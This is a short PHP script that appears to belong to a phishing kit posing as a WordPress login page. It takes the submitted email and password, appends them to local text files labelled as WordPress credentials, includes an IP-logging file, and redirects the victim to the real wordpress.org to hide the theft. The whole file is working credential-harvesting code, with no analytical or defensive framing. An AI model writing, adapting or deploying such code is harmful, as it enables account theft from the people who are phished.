<?php
include 'ip.php';
file_put_contents("usernames.txt", "Wordpress Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Wordpress Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://wordpress.org/');
?>
